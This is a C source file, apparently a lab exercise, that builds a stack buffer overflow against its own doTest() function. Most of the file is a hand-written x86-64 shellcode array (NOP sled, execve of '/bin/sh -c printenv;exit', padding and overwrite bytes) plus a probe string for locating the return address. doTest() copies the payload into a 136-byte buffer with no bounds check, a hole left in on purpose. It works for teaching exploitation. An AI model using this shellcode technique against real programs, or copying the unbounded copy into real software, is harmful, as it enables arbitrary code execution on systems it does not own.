#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void doTest();

int main(int argc, char * argv[]){

    putenv("MD5=8b7588b30498654be2626aac62ef37a3");

    /* call the vulnerable function */
    doTest();

    exit(0);
}

// VAriable to contain hex bytes of shell code
char compromise[224] = {
    0x90,
    0x90,
    0x90,
    0x90,
    0x90,
    0x90,
    0x90,
    0x90,
    0xEB,
    0x52,                   
    0x5E,
    0x48,
    0x31,
    0xC0,
    0x88,
    0x46,
    0x07,                             
    0x88,
    0x46,
    0x0B,                             
    0x88,
    0x46,
    0x19,                             
    0x48,
    0x89,
    0x46,
    0x32, 
    0x48,
    0x89,
    0x76,
    0x1A,                     
    0x48,
    0x8D,
    0x7E,
    0x09,                          
    0x48,
    0x89,
    0x7E,
    0x22,                        
    0x48,
    0x8D,
    0x7E,
    0x0C,                          
    0x48,
    0x89,
    0x7E,
    0x1E,
    0xB0,
    0x3B,                              
    0x48,
    0x89,
    0xF7,                        
    0x48,
    0x8D,
    0x76,
    0x1A,
    0x48,
    0x89,
    0xE2,                            
    0x48,
    0xC1,
    0xEA,
    0x20,                       
    0x48,
    0xC1,
    0xE2,
    0x20,                          
    0xB9,
    0xFF,
    0xE6,
    0x7B,
    0xFF,                        
    0x30,
    0xC9,                            
    0x48,
    0x09,
    0xCA,                            
    0x48,
    0x8B,
    0x12,                        
    0x0F,
    0x05,                         
    0x48,
    0x89,
    0xC7,                          
    0x48,
    0x31,
    0xC0,                          
    0xB0,
    0x3C,                        
    0x0F,
    0x05,                               
    0xE8,
    0xA9,
    0xFF,
    0xFF,
    0xFF,           
    0x2F,
    0x62,
    0x69,
    0x6E,
    0x2F,
    0x73,
    0x68,
    0x58,
    0x79,      
    0x2D,
    0x63,
    0x58,                 
    0x70,
    0x72,
    0x69,
    0x6E,
    0x74,
    0x65,
    0x6E,
    0x76,
    0x3B,    
    0x65,
    0x78,
    0x69,
    0x74,
    0x58,         
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,        
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,        
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,             
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,      
    0x93,
    0x00              
};

// string variable to probe the stack and find the correct
// values for the shell code.
char * compromise1 =
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxx"
    "MNOPWXYZ"  // 0X4D4E4F505758595A
    "xxxxxxxx";
    // Enviroment Variable Address: 0x7ffff7be600
    
int i;
void doTest(){
    char buffer[136];
    /* copy the contents of the compromise
       string onto the stack
       - change compromise1 to compromise
         when shell code is written */
    for (i = 0; compromise[i]; i++){
	buffer[i] = compromise[i];
    }
}

